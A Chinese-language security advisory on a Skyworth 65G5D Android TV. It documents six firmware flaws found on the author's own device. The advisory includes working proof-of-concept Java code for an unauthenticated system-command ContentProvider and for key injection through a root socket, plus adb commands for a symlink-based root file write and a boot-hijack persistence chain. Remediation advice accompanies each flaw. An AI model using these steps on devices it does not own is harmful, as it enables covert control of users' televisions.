# 创维 65G5D 电视 安全漏洞清单（独立版）

> 版本 v1.0 · 编写日期 2026-10-22 · 基线证据 2026-10-21，2026-10-22 复核
> 适用对象：创维 Skyworth 65G5D（`1AA45_G5D`，主板 `skyT963_8A001_P31`，Amlogic T963）
> 固件：`PPR1.180610.011.20241227`（`user/dev-keys`，Android 9 / SDK 28）
> 性质：**自有设备本地安全评估**，用于向厂商反馈与自我加固，不针对任何第三方设备。

## 一、结论摘要

这台电视**没有 root，也没有 `su`**（`ro.debuggable=0`、块设备 `root:root 0600`）。但它出厂自带 6 处可组合的信任缺陷，使得：

1. **任意一个已安装的普通应用（无需任何权限、无需用户点击）就能让 system 进程执行命令**（V1）；
2. **任意应用（或 shell）可以在 root 拥有的目录里创建 root 属主的文件**（V2），配合厂商自己的开机规则即可**持久化劫持开机启动项**；
3. **SELinux 全局 Permissive**（V5）让上述链路的每一环都不被拦截，并额外解锁“启停任意 init 服务”（V3）；
4. 一个 **以 root 运行、socket 权限 `srwx---rwx`** 的厂商守护进程（V4）允许任意应用读状态、注入按键；
5. 安装校验开关（V6）可被关闭，APK 安装不再需要用户在电视上确认。

其中 V1 + V2 + V5 已在真实设备上完成端到端利用（2026-10-21），并实际改写了开机行为；V4 于 2026-10-22 复核仍可从普通应用调用成功。

## 二、权限模型：从「普通应用」到「root 写文件」

```
                       ┌─────────────────────────────────────────────┐
 普通应用 uid=10048 ──► │ V1  com.tianci.provider / execLinuxCmd       │──► system(1000) 执行 pm / mkdir / reboot
                       └─────────────────────────────────────────────┘
                       ┌─────────────────────────────────────────────┐
 普通应用 uid=10048 ──► │ V4  /data/socketsys/sys_info (root 进程)     │──► 读状态 / 注入按键
                       └─────────────────────────────────────────────┘
                       ┌─────────────────────────────────────────────┐
 可写 /data/log 者 ───► │ V2  /data/log (0777) + root logcat 符号链接  │──► 在 root 目录创建任意文件（内容不可控）
                       └─────────────────────────────────────────────┘
                                    ▲
                       ┌────────────┴────────────────────────────────┐
 shell(2000) ─────────► │ V3  Permissive → setprop ctl.start/stop      │  （也用于立即触发 V2）
                       └─────────────────────────────────────────────┘
                       ┌─────────────────────────────────────────────┐
 任意应用 ────────────► │ V5  SELinux Permissive（全局）               │  放大以上全部
                       └─────────────────────────────────────────────┘
```

**关键认知**：这台机器上没有「一步到 root shell」的漏洞。真实收益是
**system 身份的命令执行（3 条固定命令）** 与 **root 身份的文件创建（内容不可控）**。
后者已足够劫持开机流程，因为厂商的开机规则只判断「文件是否存在」。

## 三、漏洞详情

### V1 — ContentProvider 无认证 system-uid 命令执行

| 项 | 内容 |
|---|---|
| 等级 | 高（7.8） |
| 组件 | `com.tianci.system` / `com.tianci.provider.SystemContentProvider`，authority `com.tianci.provider` |
| 起点 | **任意已安装的普通应用**（无权限、无用户交互） |
| 结果 | 以 `system`(uid 1000) 身份执行白名单内的 3 条命令 |

**位置与发现路径**

1. 通过 ADB 导出全量 `/system` 文件（3,225 文件 / 1.67 GB）并列出各系统应用；
2. 用 REA 6.7.0 + jadx 反编译 `com.tianci.system`，检索 `execLinuxCmd` / `CommonProvider`，定位到
   `com.tianci.provider.SystemContentProvider` → `com.tianci.provider.business.CommonProvider.execLinuxCmd`；
3. `dumpsys package com.tianci.system` 确认该 provider 已注册且对外暴露（`[com.tianci.provider]`）；
   实测调用未经过任何权限校验（无 `SecurityException`，普通应用直接拿到返回值）；
4. 写了一个 13 KB 的探针应用 `com.dsh.sysprobe` 实测调用（见下）。

**调用协议（PoC）**

```java
Uri URI = Uri.parse("content://com.tianci.provider");

Bundle data = new Bundle();
data.putInt("cmd", 6);                       // 命令序号
data.putString("param", "/data/system/poc"); // 参数

Bundle wrap = new Bundle();
wrap.putParcelable("param", data);
wrap.putBoolean("method_set", true);

Bundle res = getContentResolver().call(URI, "COMMON", "execLinuxCmd", wrap);
// res: {"ret": true}
```

**可执行命令表**（`cmds[]` 中只有这 3 条非空）

| 序号 | 命令 | 说明 |
|---|---|---|
| 2 | `pm install` | 以 system 身份安装 APK |
| 5 | `reboot` | 重启 |
| 6 | `mkdir` | 以 system 身份建目录 |

> 序号 0 `CHMOD`、1 `CP`、3 `PM_UNINSTALL`、4 `MOUNT` 在 `cmds[]` 中是**空字符串**，实际未实现。

**实测证据**

- 2026-10-21：普通应用（uid 10048）调用序号 6，成功在 `/data/system/` 创建目录，属主 `system:system`。
- 2026-10-22 复核：uid 10048 调用返回 `RESULT: Bundle[...] ret = true`，无 `SecurityException`
  （说明既无权限校验，也无调用方身份校验）。
- 注意：`ret=true` 只表示请求被受理，**不表示命令成功**。本次指向 `/data/local/tmp/` 的 `mkdir`
  未产生目录，因为 `system` 对 `/data/local/tmp`（`0771 shell:shell`）没有写权限——这反过来说明
  执行者确实是 system 而非 shell/root。

**影响**

- 任意应用可在 system 可写的系统目录里创建文件/目录（`/data/system`、`/data/ccos` 等），
  为后续持久化（V2、开机规则）铺路；
- 以 system 身份安装 APK，可绕过部分安装限制；
- 以 system 身份重启设备（拒绝服务）。

**修复建议**

- provider 改为 `android:exported="false"`，或加签名级 `android:permission`；
- 在 `call()` 内校验 `Binder.getCallingUid()`（仅允许本包/system/factory 测试包）；
- `cmds[]` 中不要把 `pm install`、`reboot` 这类能力暴露给非特权调用方。

### V2 — `/data/log` 世界可写 + root logcat 符号链接 → root 任意文件写

| 项 | 内容 |
|---|---|
| 等级 | 中（6.0） |
| 组件 | `/data/log`、init 服务 `getlogservice`、`/vendor/bin/getlog.sh`（`logcatdog`） |
| 起点 | 任意应用或 shell（只要能在 `/data/log` 里创建符号链接） |
| 结果 | 在 root 归属目录中创建 **root:root 0600** 文件，内容为 logcat 输出 |

**位置（本次实测快照）**

```text
drwxrwxrwx 3 log   log   4096 2026-10-21 20:52 /data/log
lrwxrwxrwx 1 shell shell   22 2026-10-21 20:52 /data/log/log.txt -> /data/ccos/customStart
```

`/vendor/etc/init/hw/init.skyworth.rc:121`：

```text
service getlogservice /system/bin/logcat -v threadtime -f /data/log/log.txt
    class main
    user root
    group root
    disabled
    seclabel u:r:getlogservice:s0
```

`logcatdog`（`/vendor/bin/getlog.sh`，`user root`）在循环里执行 `start getlogservice`，
并在文件超限/无输出时重启它——**也就是说，符号链接存在时，厂商自己的看门狗会把 root logcat 拉起来**，
不需要攻击者触发。

**获取步骤**

```bash
# 1) 在 0777 的 /data/log 中把日志路径换成任意目标的符号链接
adb shell ln -sf /data/ccos/customStart /data/log/log.txt

# 2) 触发（可选；logcatdog 自己也会 start）
adb shell setprop ctl.start getlogservice

# 3) root 的 logcat 跟随符号链接打开文件，创建目标
adb shell ls -l /data/ccos/customStart     # shell 无权读，但文件已存在
```

**实测证据**

- 2026-10-21 实测在 `/data/local/tmp/` 创建出 `root:root`、`0600`、约 448 KB 的文件；
- 本项目用它创建了 `/data/ccos/customStart`（root 目录，shell 不可写），作为开机规则 #17 的文件条件；
- 2026-10-22 复核：符号链接仍指向 `/data/ccos/customStart`，条件仍处于“上膛”状态。

**限制（如实记录）**

- 写入内容是 logcat 输出，**内容不可精确控制**；权限固定 `0600`，无法覆盖已有文件；
- 因此它的实战价值是「**文件存在性开关**」与「往 root 目录投放数据」，不是任意内容写。

**影响**

制造商开机规则 `customStart` 只判断 `/data/ccos/customStart` **是否存在**，配合 `persist.sys.custom.pkg/cls`
即可让任意组件在开机时被拉起 → **持久化**（见第五节）。同类目标包括 `/data/ccos/force_upgrade`
（强制 OTA 分支）等只以文件存在性判定的路径。

**修复建议**

- `/data/log` 权限改为 `0770 log:log`（不要 `chown -R system` 后仍留 0777）；
- `logcat` 打开日志文件时使用 `O_NOFOLLOW`，或在打开前 `lstat` 校验非常规文件；
- 开机规则中的文件条件改为校验属主/内容/签名，而不是仅 `exists`。

### V3 — SELinux Permissive 下任意 init 服务启停

| 项 | 内容 |
|---|---|
| 等级 | 中（6.6） |
| 组件 | `ro.boot.selinux=permissive` + `init` 的 `ctl.*` 属性 |
| 起点 | shell（ADB，uid 2000） |
| 结果 | `start`/`stop` 任意 init 服务，包括以 root 运行的服务 |

**获取步骤**

```bash
adb shell getprop ro.boot.selinux          # permissive
adb shell setprop ctl.start getlogservice  # 启动 root logcat（V2 的触发器）
adb shell setprop ctl.start cmdexecutor
adb shell getprop init.svc.cmdexecutor     # running
```

**实测证据**

- `ro.boot.selinux=permissive`（本次复核一致）；`ro.build.type=user`，说明这不是工程样机设置，而是量产固件策略；
- `cmdexecutor`、`socketsys` 等 root 服务在运行（`init.svc.*: running`），可被 `ctl.stop` 直接停掉。

**影响**

放大 V1/V2：本应被 SELinux 拦下的越权操作全部放行；同时可直接停掉安全/日志/看门狗服务造成拒绝服务。

**修复建议**

- 量产固件改为 `enforcing`，并补齐 `getlogservice`、`socketsys`、`cmdexecutor` 的域策略；
- property service 对 `ctl.*` 增加调用方 UID 白名单（仅 init/root）。

### V4 — root 守护进程 socket 世界可读写

| 项 | 内容 |
|---|---|
| 等级 | 中低（4.9） |
| 组件 | `/system/bin/socketsys`（init 服务 `socketsys`）+ `/data/socketsys/sys_info` |
| 起点 | **任意已安装应用**（无需 ADB） |
| 结果 | 与 root 进程通信：读取运行状态、注入按键事件 |

**位置（本次实测快照）**

```text
srwx---rwx 1 root root 0 2026-10-22 07:06 /data/socketsys/sys_info

service socketsys /system/bin/socketsys
    class main
    user root
    group root
    seclabel u:r:shell:s0        # 注意：root UID 却跑在 shell 域
```

**协议与 PoC**

```java
LocalSocket ls = new LocalSocket();
ls.connect(new LocalSocketAddress("/data/socketsys/sys_info",
        LocalSocketAddress.Namespace.FILESYSTEM));
OutputStream os = ls.getOutputStream();
InputStream  is = ls.getInputStream();
os.write("get:gamemode\n".getBytes());   // 另有 "set:keycode:<code>"（注入按键）
os.flush();
byte[] buf = new byte[4096];
int n = is.read(buf);
```

**实测证据**

- 2026-10-22 22:00:54，普通应用 uid 10048 收到 `SOCK RECV(13): gamemode:{0}`；
- socket 权限 `srwx---rwx`（other 可读写），无 SO_PEERCRED 校验；
- 进程 `user root` 但 `seclabel u:r:shell:s0`——即使将来开启 enforcing，该进程仍处在极宽的 shell 域。

**影响**

- `set:keycode:<code>` 可向系统注入按键，等同“远程遥控”，可用于在用户不知情时操作前台应用；
- 结合 V6（安装无确认）可进一步降低攻击门槛；
- 读取设备运行状态（游戏模式等）。

**修复建议**

- socket 权限改 `0660 root:system` 并校验对端 UID；
- 为 `socketsys` 建立专用 SELinux 域，去掉 `u:r:shell:s0`；
- 命令协议增加认证令牌，并限制 `set:keycode` 仅内部调用。

### V5 — SELinux 全局 Permissive（配置性缺陷 / 放大器）

| 项 | 内容 |
|---|---|
| 等级 | 信息（不单独评分） |
| 位置 | `ro.boot.selinux=permissive`（bootloader/内核命令行 → Android 属性） |
| 影响 | V1、V2、V3、V4 的任一环都不被策略拦截；原本只能“看到拒绝日志”的操作变成真正生效 |

**验证**

```bash
adb shell getprop ro.boot.selinux   # permissive
adb shell getenforce                # 若可用，同样返回 Permissive
```

**修复建议**

- 出厂即 `enforcing`，对 `shell` 域限制 `set_prop(ctl_*)`、对 `untrusted_app` 限制写 `/data/log`。

### V6 — 安装校验开关可被任意 shell 关闭

| 项 | 内容 |
|---|---|
| 等级 | 低（3.3） |
| 位置 | 系统属性 `persist.sys.disable.install.verify` |
| 起点 | shell（ADB）；是否允许普通应用写入未验证 |
| 结果 | 安装 APK 时不再要求用户在电视上确认 |

**验证**

```bash
adb shell getprop persist.sys.disable.install.verify   # 1
adb shell setprop persist.sys.disable.install.verify 0 # 恢复校验
```

**影响**

本机改造中用它把“安装要重试 4–8 次”变成一次成功；同样的开关也能让恶意包静默落地。
单独看危害有限（需要 shell），但与 V4 的按键注入、V1 的 system `pm install` 组合后可放大。

**修复建议**

- 删除该调试属性，或改为仅工厂模式/签名校验后才生效。

## 四、组合利用（已在本机实际跑通的链）

```text
① V2  符号链接：/data/log/log.txt -> /data/ccos/customStart
② V5  允许 + 厂商 logcatdog 自动 start getlogservice
③ root logcat 创建 /data/ccos/customStart（root:root 0600）
④ shell setprop persist.sys.custom.pkg  <目标包>
        setprop persist.sys.custom.cls  <目标组件>
⑤ 开机：system_server 读 /system/etc/bootintent.xml
        → 第 17 条 customStart：文件存在 + 两个属性非空
        → 直接 startActivity(目标组件)
```

第 ⑤ 步所依赖的厂商配置（原文摘录）：

```xml
<home name="customStart" propcomp="persist.sys.custom.pkg/persist.sys.custom.cls">
    <file type="exists">/data/ccos/customStart</file>
</home>
```

**结果**：开机约 20 秒直接进入指定应用（本项目用于替换酷开桌面、直达自建播放器），
全程无需 root、无需改系统分区。**同一机制也能把任意组件设为开机启动项。**

> 备注：`persist.sys.custom.*` 属于 shell 可写的 `persist.*` 属性，不需要 V1/V2；
> V1/V2 解决的是「文件条件」那一半。

## 五、用户侧临时缓解（不依赖厂商）

| 措施 | 作用 | 代价 |
|---|---|---|
| 关闭网络 ADB（`setprop persist.adb.tcp.port ""` 后重启，或设置里关闭调试） | 切断 V3/V6 的入口 | 不能用 adb 维护 |
| 只在可信 Wi-Fi 开启 ADB，用完即关 | 同上 | 每次手动 |
| 不安装来路不明的 APK | 切断 V1/V2/V4 的起点（这三个都只需普通应用） | — |
| 定期检查 `adb shell getprop persist.sys.custom.pkg` 与 `/data/log` | 发现被重新“上膛” | 需要 ADB |
| 路由器侧隔离电视（单独 VLAN/访客网络） | 限制 ADB(5555) 暴露面 | 影响投屏等局域网功能 |

**注意**：V1、V2、V4 的起点是“任意已安装应用”，不依赖 ADB。只要系统仍允许侧载且 SELinux 仍为
permissive，终端用户侧无法根治，必须由厂商修复。

## 六、修复优先级建议（给厂商）

| 优先级 | 项 | 理由 |
|---|---|---|
| P0 | V1 provider 加签名权限 + 校验 `Binder.getCallingUid()` | 任意应用即可 system 命令执行，影响面最大 |
| P0 | V2 `/data/log` 改 `0770`，logcat 用 `O_NOFOLLOW` | 与开机规则组合即成持久化 |

| P2 | V3 `ctl.*` 调用方白名单 | 需要 shell，危害次之 |
| P2 | V6 移除调试属性 | 属加固项 |

## 七、附录
